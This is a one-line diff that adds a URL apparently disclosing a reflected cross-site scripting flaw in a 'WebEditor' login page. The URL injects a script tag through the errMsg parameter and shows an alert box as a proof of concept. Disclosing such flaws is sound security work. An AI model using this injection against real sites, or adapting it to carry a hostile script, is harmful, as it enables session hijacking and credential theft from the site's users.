@@ -1,0 +1,1 @@
+http://www.example.com/WebEditor/Authentication/LoginPage.aspx?ReturnUrl=%2fWebEditor%2fDefault.aspx&amp;errMsg=User+is+locked.+Too+many+logon+attempts.&quot;&gt;&lt;script&gt;alert(&#039;XSS-By-Lament&#039;)&lt;/script&gt;
